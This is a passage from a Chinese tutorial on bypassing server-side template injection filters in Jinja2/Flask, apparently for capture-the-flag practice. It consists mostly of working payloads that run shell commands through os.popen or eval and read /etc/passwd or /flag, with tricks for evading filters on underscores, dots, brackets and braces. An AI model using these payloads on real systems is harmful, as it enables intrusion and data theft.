</span></span><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__base__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">77</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#58a1dd">request</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">args</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">os</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">popen</span>(<span style="color:#58a1dd">request</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">args</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">cmd</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">os</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">os</span><span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">cmd</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">ls</span> <span style="color:#ff636f">/</span></span></span></code></pre></div><p>等同于：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">40</span>)(<span style="color:#a6be9d">&#39;/etc/passwd&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__base__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">77</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;os&#39;</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">popen</span>(<span style="color:#a6be9d">&#39;ls /&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}</span></span></code></pre></div><p>如果过滤了<code>args</code>，可以将其中的<code>request.args</code>改为<code>request.values</code>，POST和GET两种方法传递的数据<code>request.values</code>都可以接收。</p>
<h3 id="过滤了下划线__" class="heading-element"><span>过滤了下划线__</span>
  <a href="#%e8%bf%87%e6%bb%a4%e4%ba%86%e4%b8%8b%e5%88%92%e7%ba%bf__" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 id="利用request对象绕过-1" class="heading-element"><span><strong>利用request对象绕过</strong></span>
  <a href="#%e5%88%a9%e7%94%a8request%e5%af%b9%e8%b1%a1%e7%bb%95%e8%bf%87-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>和上面一样，我们这里利用request绕过</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()[<span style="color:#58a1dd">request</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">args</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">class</span>][<span style="color:#58a1dd">request</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">args</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">bases</span>][<span style="color:#a6be9d">0</span>][<span style="color:#58a1dd">request</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">args</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">subclasses</span>]()[<span style="color:#a6be9d">40</span>](<span style="color:#a6be9d">&#39;/flag&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">class</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">bases</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">__bases__</span><span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">subclasses</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">__subclasses__</span>
</span></span><span style="display:flex;"><span>{{()[<span style="color:#58a1dd">request</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">args</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">class</span>][<span style="color:#58a1dd">request</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">args</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">bases</span>][<span style="color:#a6be9d">0</span>][<span style="color:#58a1dd">request</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">args</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">subclasses</span>]()[<span style="color:#a6be9d">77</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;os&#39;</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">popen</span>(<span style="color:#a6be9d">&#39;ls /&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">class</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">bases</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">__bases__</span><span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">subclasses</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">__subclasses__</span> </span></span></code></pre></div><p>等同于：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">40</span>)(<span style="color:#a6be9d">&#39;/etc/passwd&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__base__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">77</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;os&#39;</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">popen</span>(<span style="color:#a6be9d">&#39;ls /&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}</span></span></code></pre></div><p>很厉害的一种方法，利用传其他参可以绕过很多针对这一处参数的过滤</p>
<h3 id="过滤了点-" class="heading-element"><span>过滤了点 .</span>
  <a href="#%e8%bf%87%e6%bb%a4%e4%ba%86%e7%82%b9-" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 id="利用-attr-绕过适用于flask" class="heading-element"><span><strong>利用 <code>|attr()</code> 绕过（适用于flask）</strong></span>
  <a href="#%e5%88%a9%e7%94%a8-attr-%e7%bb%95%e8%bf%87%e9%80%82%e7%94%a8%e4%ba%8eflask" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>如果 <code>.</code> 也被过滤，且目标是JinJa2（flask）的话，可以使用原生JinJa2函数<code>attr()</code>，即：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span>   <span style="color:#58a1dd">相当于</span>  ()<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__class__&#34;</span>)</span></span></code></pre></div><p>示例：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__class__&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__base__&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__subclasses__&#34;</span>)()<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__getitem__&#34;</span>)(<span style="color:#a6be9d">77</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__init__&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__globals__&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__getitem__&#34;</span>)(<span style="color:#a6be9d">&#34;os&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;popen&#34;</span>)(<span style="color:#a6be9d">&#34;ls /&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;read&#34;</span>)()}}</span></span></code></pre></div><p>等同于：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__base__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">77</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;os&#39;</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">popen</span>(<span style="color:#a6be9d">&#39;ls /&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}</span></span></code></pre></div><p>其实这个函数是一个 <code>attr()</code> 过滤器，它只查找属性，获取并返回对象的属性的值，过滤器与变量用管道符号（ <code>|</code> ）分割，它不止可以绕过点。</p>
<p><code>|attr()</code> 配合其他姿势可同时绕过双下划线 <code>__</code> 、引号、点 <code>.</code> 和 <code>[</code> 等。</p>
<h4 id="利用中括号-绕过" class="heading-element"><span><strong>利用中括号[ ]绕过</strong></span>
  <a href="#%e5%88%a9%e7%94%a8%e4%b8%ad%e6%8b%ac%e5%8f%b7-%e7%bb%95%e8%bf%87" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>中括号直接拼接就可以，不需要用到<code>.</code></p>
<p>如下示例：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#a6be9d">&#39;&#39;</span>[<span style="color:#a6be9d">&#39;__class__&#39;</span>][<span style="color:#a6be9d">&#39;__bases__&#39;</span>][<span style="color:#a6be9d">0</span>][<span style="color:#a6be9d">&#39;__subclasses__&#39;</span>]()[<span style="color:#a6be9d">59</span>][<span style="color:#a6be9d">&#39;__init__&#39;</span>][<span style="color:#a6be9d">&#39;__globals__&#39;</span>][<span style="color:#a6be9d">&#39;__builtins__&#39;</span>][<span style="color:#a6be9d">&#39;eval&#39;</span>](<span style="color:#a6be9d">&#39;__import__(&#34;os&#34;).popen(&#34;ls&#34;).read()&#39;</span>)}}</span></span></code></pre></div><p>等同于：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span><span style="color:#ff636f">.</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()<span style="color:#ff636f">.</span>[<span style="color:#a6be9d">59</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span>[<span style="color:#a6be9d">&#39;__globals__&#39;</span>][<span style="color:#a6be9d">&#39;__builtins__&#39;</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">eval</span>(<span style="color:#a6be9d">&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span>)}}</span></span></code></pre></div><p><strong>同时，我们可以发现,这样绕过点之后，我们几乎所有的关键字都成了字符串，我们就可以用上面的一些方法绕过了，比如hex编码，这样我们几乎可以绕过全部的过滤。</strong></p>
<h3 id="过滤了大括号-" class="heading-element"><span>过滤了大括号 <code>{{</code></span>
  <a href="#%e8%bf%87%e6%bb%a4%e4%ba%86%e5%a4%a7%e6%8b%ac%e5%8f%b7-" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>有时候也是str_replace把双大括号换掉或者把大括号换掉，思路不能太死板。</p>
<p>我们可以用Jinja2的 <code>{%...%}</code> 语句装载一个循环控制语句来绕过，这里我们在一开始认识flask的时候就学习了：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#ff636f">for</span> <span style="color:#58a1dd">c</span> <span style="color:#ff636f">in</span> []<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__base__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>() <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#ff636f">if</span> <span style="color:#58a1dd">c</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__name__</span><span style="color:#ff636f">==</span><span style="color:#a6be9d">&#39;catch_warnings&#39;</span> <span style="color:#ff636f">%</span>}{{ <span style="color:#58a1dd">c</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;__builtins__&#39;</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">eval</span>(<span style="color:#a6be9d">&#34;__import__(&#39;os&#39;).popen(&#39;ls /&#39;).read()&#34;</span>)}}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">endif</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">endfor</span> <span style="color:#ff636f">%</span>}</span></span></code></pre></div><p>也可以使用 <code>{% if ... %}1{% endif %}</code> 配合 <code>os.popen</code> 和 <code>curl</code> 将执行结果外带（不外带的话无回显）出来：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#ff636f">if</span> <span style="color:#a6be9d">&#39;&#39;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__base__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">59</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">func_globals</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">linecache</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">os</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">popen</span>(<span style="color:#a6be9d">&#39;ls /&#39;</span> <span style="color:#ff636f">%</span>}<span style="color:#a6be9d">1</span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">endif</span> <span style="color:#ff636f">%</span>}</span></span></code></pre></div><p>也可以用 <code>{%print(......)%}</code> 的形式来代替<code>{{ }}</code>，如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#ff636f">%</span><span style="color:#58a1dd">print</span>(<span style="color:#a6be9d">&#39;&#39;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__base__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">77</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;os&#39;</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">popen</span>(<span style="color:#a6be9d">&#39;ls&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>())<span style="color:#ff636f">%</span>}</span></span></code></pre></div><h2 id="组合bypass" class="heading-element"><span>组合Bypass</span>
  <a href="#%e7%bb%84%e5%90%88bypass" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 id="同时过滤了--和-" class="heading-element"><span>同时过滤了 . 和 []</span>
  <a href="#%e5%90%8c%e6%97%b6%e8%bf%87%e6%bb%a4%e4%ba%86--%e5%92%8c-" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code>|attr()`+`__getitem__</code></pre><p>绕过姿势：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__class__&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__base__&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__subclasses__&#34;</span>)()<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__getitem__&#34;</span>)(<span style="color:#a6be9d">77</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__init__&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__globals__&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;__getitem__&#34;</span>)(<span style="color:#a6be9d">&#34;os&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;popen&#34;</span>)(<span style="color:#a6be9d">&#34;ls&#34;</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">attr</span>(<span style="color:#a6be9d">&#34;read&#34;</span>)()}}</span></span></code></pre></div><p>等同于：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__base__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">77</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;os&#39;</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">popen</span>(<span style="color:#a6be9d">&#39;ls&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}</span></span></code></pre></div><h3 id="同时过滤了-__-点-和-" class="heading-element"><span>同时过滤了 __ 、点. 和 []</span>
  <a href="#%e5%90%8c%e6%97%b6%e8%bf%87%e6%bb%a4%e4%ba%86-__-%e7%82%b9-%e5%92%8c-" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code>__getitem__`+`|attr()`+`request
